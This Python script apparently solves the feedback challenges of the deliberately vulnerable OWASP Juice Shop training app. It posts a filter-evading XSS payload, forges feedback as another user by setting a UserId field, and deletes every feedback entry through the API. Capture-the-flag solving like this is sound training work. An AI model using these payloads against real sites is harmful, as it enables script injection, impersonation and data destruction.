import json

from authentication import get_admin_session


def get_feedback_list(server, session):
    """
    Get existing feedback as a list
    :param server: juice shop URL
    :param session: Requests Session
    :return: list containing feedback objects
    """
    feedback = session.get('{}/api/Feedbacks/'.format(server))
    if not feedback.ok:
        raise RuntimeError('Error retrieving feedback.')
    return feedback.json().get('data')


def delete_all_feedback(server, session):
    """
    Deletes ALL existing feedback.
    :param server: juice shop URL
    :param session: Session
    """
    feedback = get_feedback_list(server, session)
    print('Deleting all feedback...'),
    for entry in feedback:
        d = session.delete('{}/api/Feedbacks/{}'.format(server, entry.get('id')))
        if not d.ok:
            raise RuntimeError('Error deleting feedback.')
    print('Success.')


def send_feedback(server, session, payload):
    """
    Submit feedback directly to the API.
    :param server: juice shop URL.
    :param session: Session
    :param payload: feedback content
    """
    submit = session.post('{}/api/Feedbacks'.format(server),
                          headers={'Content-type': 'application/json'},
                          data=json.dumps(payload))
    if not submit.ok:
        raise RuntimeError('Error submitting feedback.')


def submit_zero_star_feedback(server, session):
    print('Submitting zero star feedback...'),
    payload = {'comment': 'welp', 'rating': 0}
    send_feedback(server, session, payload)
    print('Success.')


def submit_xss4_feedback(server, session):
    print('Submitting XSS4 exploit as feedback comment...'),
    payload = {'comment': '<</b>script>alert("XSS4")<</b>/script>'}
    send_feedback(server, session, payload)
    print('Success.')


def inform_shop_of_problem_libraries(server, session):
    print('Submitting feedback on bad dependencies...'),
    payload = {'comment': 'z85 0.0\nsequelize 1.7'}
    send_feedback(server, session, payload)
    print('Success.')


def submit_feedback_as_another_user(server):
    print('Submitting feedback from admin account as userid 2...'),
    session = get_admin_session(server)
    payload = {'comment': 'nyah nyah', 'UserId': 2}
    send_feedback(server, session, payload)
    print('Success.')


def solve_feedback_challenges(server):
    print('\n== FEEDBACK CHALLENGES ==\n')
    session = get_admin_session(server)
    submit_zero_star_feedback(server, session)
    submit_xss4_feedback(server, session)
    inform_shop_of_problem_libraries(server, session)
    submit_feedback_as_another_user(server)
    delete_all_feedback(server, session)
    print('\n== FEEDBACK CHALLENGES COMPLETE ==\n')
